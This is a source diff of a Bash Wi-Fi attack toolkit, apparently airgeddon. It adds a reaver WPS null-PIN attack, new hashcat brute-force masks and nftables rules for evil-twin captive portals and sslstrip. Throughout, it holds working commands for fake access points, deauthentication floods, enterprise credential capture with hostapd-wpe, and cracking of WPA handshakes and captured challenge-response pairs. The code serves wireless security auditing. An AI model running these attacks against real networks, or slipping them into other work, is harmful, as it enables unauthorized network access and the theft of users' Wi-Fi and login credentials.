+	language_strings "${language}" 115 "read"
+}
+
 #Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
 function manage_captive_portal_log() {
 
@@ -6763,7 +7648,7 @@ function parse_from_enterprise() {
 	unset enterprise_captured_challenges_responses
 	declare -gA enterprise_captured_challenges_responses
 
-	readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${tmpdir}${hostapd_wpe_log}" | sort -k 2,2 | uniq --skip-fields=1 2> /dev/null)
+	readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${tmpdir}${hostapd_wpe_log}" | sort -k 2,3 | uniq --skip-fields=1 2> /dev/null)
 	for item in "${CAPTURED_USERNAMES[@]}"; do
 		[[ "${item}" =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="${BASH_REMATCH[1]}" && username="${BASH_REMATCH[2]}"
 		line_to_check=$((line_number + 1))
@@ -7006,18 +7891,18 @@ function set_charset() {
 	language_strings "${language}" 198
 	language_strings "${language}" 199
 	language_strings "${language}" 200
+	language_strings "${language}" 201
+	language_strings "${language}" 202
+	language_strings "${language}" 203
+	language_strings "${language}" 204
+	language_strings "${language}" 205
+	language_strings "${language}" 206
+	language_strings "${language}" 207
+	print_hint ${current_menu}
 
+	read -rp "> " charset_option
 	case ${1} in
 		"aircrack"|"jtr")
-			language_strings "${language}" 201
-			language_strings "${language}" 202
-			language_strings "${language}" 203
-			language_strings "${language}" 204
-			language_strings "${language}" 205
-			language_strings "${language}" 206
-			language_strings "${language}" 207
-			print_hint ${current_menu}
-			read -rp "> " charset_option
 			case ${charset_option} in
 				1)
 					charset=${crunch_lowercasecharset}
@@ -7055,9 +7940,6 @@ function set_charset() {
 			esac
 		;;
 		"hashcat")
-			language_strings "${language}" 237
-			print_hint ${current_menu}
-			read -rp "> " charset_option
 			case ${charset_option} in
 				1)
 					charset="?l"
@@ -7072,14 +7954,40 @@ function set_charset() {
 					charset="?s"
 				;;
 				5)
+					charset="-1 ?l?u"
+				;;
+				6)
+					charset="-1 ?l?d"
+				;;
+				7)
+					charset="-1 ?u?d"
+				;;
+				8)
+					charset="-1 ?s?d"
+				;;
+				9)
+					charset="-1 ?l?u?d"
+				;;
+				10)
+					charset="-1 ?l?u?s"
+				;;
+				11)
 					charset="?a"
 				;;
 			esac
 
-			charset_tmp=${charset}
-			for ((i=0; i < maxlength - 1; i++)); do
-				charset+=${charset_tmp}
-			done
+			if [[ ${charset} =~ ^\-1 ]]; then
+				charset_tmp=""
+				for ((i=0; i < maxlength; i++)); do
+					charset_tmp+="?1"
+				done
+				charset="\"${charset}\" \"${charset_tmp}\""
+			else
+				charset_tmp=${charset}
+				for ((i=0; i < maxlength - 1; i++)); do
+					charset+=${charset_tmp}
+				done
+			fi
 		;;
 	esac
 
@@ -7109,10 +8017,25 @@ function set_show_charset() {
 					done
 				;;
 				*)
-					if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
-						showcharset=$(hashcat --help | grep "${charset_tmp} =" | awk '{print $3}')
+					if [[ ${charset} =~ ^\"\-1[[:blank:]]((\?[luds])+).* ]]; then
+						showcharset="${BASH_REMATCH[1]}"
+						IFS='?' read -ra charset_masks <<< "${showcharset}"
+						showcharset=""
+						for item in "${charset_masks[@]}"; do
+							if [ -n "${item}" ]; then
+								if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
+									showcharset+=$(hashcat --help | grep "${item} =" | awk '{print $3}')
+								else
+									showcharset+=$(hashcat --help | grep -E "^  ${item} \|" | awk '{print $3}')
+								fi
+							fi
+						done
 					else
-						showcharset=$(hashcat --help | grep -E "^  ${charset_tmp#'?'} \|" | awk '{print $3}')
+						if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
+							showcharset=$(hashcat --help | grep "${charset_tmp} =" | awk '{print $3}')
+						else
+							showcharset=$(hashcat --help | grep -E "^  ${charset_tmp#'?'} \|" | awk '{print $3}')
+						fi
 					fi
 				;;
 			esac
@@ -7189,11 +8112,11 @@ function exec_hashcat_bruteforce_attack() {
 	debug_print
 
 	if [ "${1}" = "personal" ]; then
-		hashcat_cmd="hashcat -m 2500 -a 3 \"${tmpdir}${hashcat_tmp_file}\" \"${charset}\" --increment --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+		hashcat_cmd="hashcat -m 2500 -a 3 \"${tmpdir}${hashcat_tmp_file}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	else
 		tmpfiles_toclean=1
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
-		hashcat_cmd="hashcat -m 5500 -a 3 \"${hashcatenterpriseenteredpath}\" \"${charset}\" --increment --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+		hashcat_cmd="hashcat -m 5500 -a 3 \"${hashcatenterpriseenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	fi
 	eval "${hashcat_cmd}"
 	language_strings "${language}" 115 "read"
@@ -7215,10 +8138,14 @@ function exec_hashcat_rulebased_attack() {
 	language_strings "${language}" 115 "read"
 }
 
-#Execute Enterprise smooth attack
+#Execute Enterprise smooth/noisy attack
 function exec_enterprise_attack() {
 
 	debug_print
+
+	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
+	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1
 
 	set_hostapd_wpe_config
 	launch_fake_ap
@@ -7232,10 +8159,46 @@ function exec_enterprise_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
-	restore_et_interface
+	if [ ${enterprise_mode} = "noisy" ]; then
+		restore_et_interface
+	else
+		if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
+			if [ -f "${tmpdir}${enterprisedir}returning_vars.txt" ]; then
+
+				local tmp_interface
+				tmp_interface=$(grep -E "^interface=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
+				if [ -n "${tmp_interface}" ]; then
+					interface="${tmp_interface}"
+				fi
+
+				local tmp_phy_interface
+				tmp_phy_interface=$(grep -E "^phy_interface=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
+				if [ -n "${tmp_phy_interface}" ]; then
+					phy_interface="${tmp_phy_interface}"
+				fi
+
+				local tmp_current_iface_on_messages
+				tmp_current_iface_on_messages=$(grep -E "^current_iface_on_messages=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
+				if [ -n "${tmp_current_iface_on_messages}" ]; then
+					current_iface_on_messages="${tmp_current_iface_on_messages}"
+				fi
+
+				local tmp_ifacemode
+				tmp_ifacemode=$(grep -E "^ifacemode=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
+				if [ -n "${tmp_ifacemode}" ]; then
+					ifacemode="${tmp_ifacemode}"
+				fi
+
+				rm -rf "${tmpdir}${enterprisedir}returning_vars.txt" > /dev/null 2>&1
+			fi
+		else
+			restore_et_interface
+		fi
+	fi
 	handle_enterprise_log
 	handle_asleap_attack
 	clean_tmpfiles
@@ -7247,30 +8210,34 @@ function handle_asleap_attack() {
 	debug_print
 
 	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
-		ask_yesno 537 "no"
-		if [ "${yesno}" = "y" ]; then
+		local result
+		result=$(cat "${tmpdir}${enterprisedir}${enterprise_successfile}")
+		if [[ ${result} -eq 0 ]] || [[ ${result} -eq 2 ]]; then
+			ask_yesno 537 "no"
+			if [ "${yesno}" = "y" ]; then
 
-			asleap_attack_finished=0
+				asleap_attack_finished=0
 
-			if [ ${enterprise_mode} = "noisy" ]; then
-				if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
-					echo
-					language_strings "${language}" 542 "yellow"
-				else
-					select_captured_enterprise_user
+				if [ ${enterprise_mode} = "noisy" ]; then
+					if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
+						echo
+						language_strings "${language}" 542 "yellow"
+					else
+						select_captured_enterprise_user
+					fi
 				fi
+
+				echo
+				language_strings "${language}" 538 "blue"
+
+				while [[ "${asleap_attack_finished}" != "1" ]]; do
+					ask_dictionary
+					echo
+					exec_asleap_attack
+					echo
+					manage_asleap_pot
+				done
 			fi
-
-			echo
-			language_strings "${language}" 538 "blue"
-
-			while [[ "${asleap_attack_finished}" != "1" ]]; do
-				ask_dictionary
-				echo
-				exec_asleap_attack
-				echo
-				manage_asleap_pot
-			done
 		fi
 	fi
 }
@@ -7343,6 +8310,7 @@ function exec_et_onlyap_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7370,6 +8338,7 @@ function exec_et_sniffing_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7401,6 +8370,7 @@ function exec_et_sniffing_sslstrip_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7423,6 +8393,7 @@ function exec_et_sniffing_sslstrip2_attack() {
 	launch_dhcp_server
 	exec_et_deauth
 	if [ "${beef_found}" -eq 1 ]; then
+		get_beef_version
 		set_beef_config
 	else
 		new_beef_pass="beef"
@@ -7441,6 +8412,7 @@ function exec_et_sniffing_sslstrip2_attack() {
 
 	kill_beef
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7456,6 +8428,9 @@ function exec_et_captive_portal_attack() {
 
 	debug_print
 
+	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
+	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1
+
 	set_hostapd_config
 	launch_fake_ap
 	set_dhcp_config
@@ -7464,9 +8439,7 @@ function exec_et_captive_portal_attack() {
 	exec_et_deauth
 	set_et_control_script
 	launch_et_control_window
-	if [ ${captive_portal_mode} = "dnsblackhole" ]; then
-		launch_dns_blackhole
-	fi
+	launch_dns_blackhole
 	set_webserver_config
 	set_captive_portal_page
 	launch_webserver
@@ -7477,6 +8450,7 @@ function exec_et_captive_portal_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7492,8 +8466,10 @@ function set_hostapd_config() {
 	tmpfiles_toclean=1
 	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
 
-	different_mac_digit=$(xxd -p -u -l 100 < /dev/urandom  | sed "s/${bssid:10:1}//g" | head -c 1)
-	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}
+	local digit_to_change
+	digit_to_change="${bssid:10:1}"
+	(( different_mac_digit=("16#${digit_to_change}" + 1 + RANDOM % 15) % 16 ))
+	et_bssid=$(printf %s%X%s\\n "${bssid::10}" "${different_mac_digit}" "${bssid:11}")
 
 	{
 	echo -e "interface=${interface}"
@@ -7555,12 +8531,11 @@ function set_hostapd_wpe_config() {
 	echo -e "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user"
 	} >> "${tmpdir}${hostapd_wpe_file}"
 
-	#TODO review certificate options for future versions. For now, using defaults
 	{
-	echo -e "ca_cert=/etc/hostapd-wpe/certs/ca.pem"
-	echo -e "server_cert=/etc/hostapd-wpe/certs/server.pem"
-	echo -e "private_key=/etc/hostapd-wpe/certs/server.key"
-	echo -e "private_key_passwd=whatever"
+	echo -e "ca_cert=${hostapd_wpe_cert_path}ca.pem"
+	echo -e "server_cert=${hostapd_wpe_cert_path}server.pem"
+	echo -e "private_key=${hostapd_wpe_cert_path}server.key"
+	echo -e "private_key_passwd=${hostapd_wpe_cert_pass}"
 	} >> "${tmpdir}${hostapd_wpe_file}"
 }
 
@@ -7570,9 +8545,9 @@ function launch_fake_ap() {
 	debug_print
 
 	if [ -n "${enterprise_mode}" ]; then
-		kill "$(ps -C hostapd-wpe --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C hostapd-wpe --no-headers -o pid | tr -d ' ')" &> /dev/null
 	else
-		kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
 	fi
 	${airmon} check kill > /dev/null 2>&1
 	nm_processes_killed=1
@@ -7605,8 +8580,15 @@ function launch_fake_ap() {
 			;;
 		esac
 	fi
-	xterm -hold -bg black -fg green -geometry "${hostapd_scr_window_position}" -T "AP" -e "${command}${log_command}" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "${command}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
+
 	sleep 3
 }
 
@@ -7644,7 +8626,7 @@ function set_dhcp_config() {
 	echo -e "\toption subnet-mask ${std_c_mask};"
 	} >> "${tmpdir}${dhcpd_file}"
 
-	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
+	if [ "${et_mode}" != "et_captive_portal" ]; then
 		echo -e "\toption domain-name-servers ${internet_dns1}, ${internet_dns2};" >> "${tmpdir}${dhcpd_file}"
 	else
 		echo -e "\toption domain-name-servers ${et_ip_router};" >> "${tmpdir}${dhcpd_file}"
@@ -7734,46 +8716,85 @@ function set_std_internet_routing_rules() {
 
 	if [ "${routing_modified}" -eq 0 ]; then
 		original_routing_state=$(cat /proc/sys/net/ipv4/ip_forward)
-		save_iptables
+		save_iptables_nftables
 	fi
 
 	ifconfig "${interface}" ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1
 	routing_modified=1
 
-	clean_iptables
+	clean_initialize_iptables_nftables
 
-	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
-		"${iptables_cmd}" -P FORWARD ACCEPT
+	if [ "${et_mode}" != "et_captive_portal" ]; then
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip filter FORWARD counter accept
+		else
+			"${iptables_cmd}" -P FORWARD ACCEPT
+		fi
 		echo "1" > /proc/sys/net/ipv4/ip_forward
 	else
-		"${iptables_cmd}" -P FORWARD DROP
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip filter FORWARD counter drop
+		else
+			"${iptables_cmd}" -P FORWARD DROP
+		fi
 		echo "0" > /proc/sys/net/ipv4/ip_forward
 	fi
 
 	if [ "${et_mode}" = "et_captive_portal" ]; then
-		"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${et_ip_router}:80
-		"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination ${et_ip_router}:80
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port 80 -j ACCEPT
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port 443 -j ACCEPT
-		if [ ${captive_portal_mode} = "dnsblackhole" ]; then
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 80 counter dnat to ${et_ip_router}:80
+			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 443 counter dnat to ${et_ip_router}:443
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport 80 counter accept
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport 443 counter accept
+		else
+			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${et_ip_router}:80
+			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination ${et_ip_router}:80
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port 80 -j ACCEPT
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port 443 -j ACCEPT
+		fi
+
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip filter INPUT udp dport 53 counter accept
+		else
 			"${iptables_cmd}" -A INPUT -p udp --destination-port 53 -j ACCEPT
 		fi
 	elif [ "${et_mode}" = "et_sniffing_sslstrip" ]; then
-		"${iptables_cmd}" -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 80 counter redirect to :${sslstrip_port}
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${sslstrip_port} counter accept
+		else
+			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
+		fi
 	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
-		"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
-		"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${bettercap_proxy_port} counter accept
+			"${iptables_cmd}" add rule ip filter INPUT udp dport ${bettercap_dns_port} counter accept
+			"${iptables_cmd}" add rule ip filter INPUT iifname "lo" counter accept
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${beef_port} counter accept
+		else
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
+			"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
+			"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
+		fi
 	fi
 
-	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
-		"${iptables_cmd}" -t nat -A POSTROUTING -o "${internet_interface}" -j MASQUERADE
+	if [ "${et_mode}" != "et_captive_portal" ]; then
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule nat POSTROUTING ip saddr ${et_ip_range}/${std_c_mask_cidr} oifname "${internet_interface}" counter masquerade
+		else
+			"${iptables_cmd}" -t nat -A POSTROUTING -o "${internet_interface}" -j MASQUERADE
+		fi
 	fi
 
-	"${iptables_cmd}" -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
-	"${iptables_cmd}" -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" add rule ip filter INPUT ip saddr ${et_ip_range}/${std_c_mask_cidr} ip daddr ${et_ip_router}/${ip_mask_cidr} icmp type echo-request ct state new,related,established counter accept
+		"${iptables_cmd}" add rule ip filter INPUT ip saddr ${et_ip_range}/${std_c_mask_cidr} ip daddr ${et_ip_router}/${ip_mask_cidr} counter drop
+	else
+		"${iptables_cmd}" -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
+		"${iptables_cmd}" -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
+	fi
 	sleep 2
 }
 
@@ -7782,7 +8803,7 @@ function launch_dhcp_server() {
 
 	debug_print
 
-	kill "$(ps -C dhcpd --no-headers -o pid)" &> /dev/null
+	kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 
 	recalculate_windows_sizes
 	case ${et_mode} in
@@ -7796,8 +8817,15 @@ function launch_dhcp_server() {
 			dchcpd_scr_window_position=${g4_middleleft_window}
 		;;
 	esac
-	xterm -hold -bg black -fg pink -geometry "${dchcpd_scr_window_position}" -T "DHCP" -e "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}/clts.txt" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "dhcpd -d -cf \"${dhcp_path}\" ${interface}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
+
 	sleep 2
 }
 
@@ -7809,19 +8837,19 @@ function exec_et_deauth() {
 	prepare_et_monitor
 
 	case ${et_dos_attack} in
-		"Mdk3")
-			kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
+		"${mdk_command}")
+			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
-			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
 		;;
 		"Aireplay")
-			kill "$(ps -C aireplay-ng --no-headers -o pid)" &> /dev/null
+			kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
 			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
 		"Wds Confusion")
-			kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
-			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
+			kill "$(ps -C ${mdk_command} --no-headers -o pid | tr -d ' ')" &> /dev/null
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
 		;;
 	esac
 
@@ -7847,8 +8875,15 @@ function exec_et_deauth() {
 		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
 		pid_control_pursuit_mode "${et_dos_attack}" "evil_twin" &
 	else
-		xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
-		et_processes+=($!)
+		manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+			et_processes+=($!)
+		else
+			get_tmux_process_id "${deauth_et_cmd}"
+			et_processes+=("${global_process_pid}")
+			global_process_pid=""
+		fi
+
 		sleep 1
 	fi
 }
@@ -7883,9 +8918,12 @@ function set_wps_attack_script() {
 			"bruteforce")
 				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -d 2 -vvv"
 			;;
+			"nullpin")
+				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -g 1 -d 2 -vvv -p ''"
+			;;
 		esac
 	else
-		unbuffer="unbuffer "
+		unbuffer="stdbuf -i0 -o0 -e0 "
 		case ${wps_attack_mode} in
 			"pindb"|"custompin")
 				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -F -B -v ${bully_verbosity} -p "
@@ -7935,6 +8973,10 @@ function set_wps_attack_script() {
 			"bruteforce")
 				script_attack_cmd1="${unbuffer} ${attack_cmd1}"
 				pin_header1="${white_color}Testing all possible PINs${normal_color}"
+			;;
+			"nullpin")
+				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
+				pin_header1="${white_color}Testing null PIN"
 			;;
 		esac
 
@@ -7986,7 +9028,7 @@ function set_wps_attack_script() {
 	cat >&7 <<-'EOF'
 			if [ "${script_wps_attack_tool}" = "reaver" ]; then
 				case ${script_wps_attack_mode} in
-					"pindb"|"custompin"|"bruteforce")
+					"pindb"|"custompin"|"bruteforce"|"nullpin")
 						failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
 						success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
 						success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
@@ -8015,7 +9057,7 @@ function set_wps_attack_script() {
 			fi
 
 			case ${script_wps_attack_mode} in
-				"pindb"|"custompin")
+				"pindb"|"custompin"|"nullpin")
 					for item in "${LINES_TO_PARSE[@]}"; do
 						if [ "${script_wps_attack_tool}" = "reaver" ]; then
 							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
@@ -8104,6 +9146,14 @@ function set_wps_attack_script() {
 
 	cat >&7 <<-EOF
 				timeout_msg="${white_color}Timeout for Pixie Dust attack${normal_color}"
+	EOF
+
+	cat >&7 <<-'EOF'
+			elif [ "${script_wps_attack_mode}" = "nullpin" ]; then
+	EOF
+
+	cat >&7 <<-EOF
+				timeout_msg="${white_color}Timeout for null PIN${normal_color}"
 			else
 				timeout_msg="${white_color}Timeout for last PIN${normal_color}"
 			fi
@@ -8221,6 +9271,15 @@ function set_wps_attack_script() {
 				eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}"
 				parse_output
 			;;
+			"nullpin")
+				echo
+				echo -e "${pin_header1}"
+				(set -o pipefail && eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}")
+				if [ "$?" = "124" ]; then
+					this_pin_timeout=1
+				fi
+				parse_output
+			;;
 		esac
 
 		if [ ${pin_cracked} -eq 1 ]; then
@@ -8251,6 +9310,7 @@ function set_wps_attack_script() {
 
 		echo
 		echo -e "${white_color}Close this window"
+		read -r -d '' _ </dev/tty
 	EOF
 
 	exec 7>&-
@@ -8261,10 +9321,6 @@ function set_wps_attack_script() {
 function set_enterprise_control_script() {
 
 	debug_print
-
-	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
-	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1
 
 	exec 7>"${tmpdir}${control_enterprise_file}"
 
@@ -8277,6 +9333,12 @@ function set_enterprise_control_script() {
 
 	cat >&7 <<-EOF
 		#!/usr/bin/env bash
+		interface="${interface}"
+		et_initial_state="${et_initial_state}"
+		interface_airmon_compatible=${interface_airmon_compatible}
+		iface_monitor_et_deauth="${iface_monitor_et_deauth}"
+		airmon="${airmon}"
+		enterprise_returning_vars_file="${tmpdir}${enterprisedir}returning_vars.txt"
 		enterprise_heredoc_mode="${enterprise_mode}"
 		path_to_processes="${tmpdir}${enterprisedir}${enterprise_processesfile}"
 		wpe_logfile="${tmpdir}${hostapd_wpe_log}"
@@ -8284,6 +9346,74 @@ function set_enterprise_control_script() {
 		done_msg="${yellow_color}${enterprise_texts[${language},9]}${normal_color}"
 		log_reminder_msg="${pink_color}${enterprise_texts[${language},10]}: [${normal_color}${enterprise_completepath}${pink_color}]${normal_color}"
 	EOF
+
+	cat >&7 <<-'EOF'
+		#Restore interface to its original state
+		function restore_interface() {
+
+			if hash rfkill 2> /dev/null; then
+				rfkill unblock all > /dev/null 2>&1
+			fi
+
+			iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1
+
+			if [ "${et_initial_state}" = "Managed" ]; then
+				ifconfig "${interface}" down > /dev/null 2>&1
+				iwconfig "${interface}" mode "managed" > /dev/null 2>&1
+				ifconfig "${interface}" up > /dev/null 2>&1
+				ifacemode="Managed"
+			else
+				if [ "${interface_airmon_compatible}" -eq 1 ]; then
+					new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
+
+					[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+					if [ "${interface}" != "${new_interface}" ]; then
+						interface=${new_interface}
+						phy_interface=$(basename "$(readlink "/sys/class/net/${interface}/phy80211")" 2> /dev/null)
+						current_iface_on_messages="${interface}"
+					fi
+				else
+					ifconfig "${interface}" down > /dev/null 2>&1
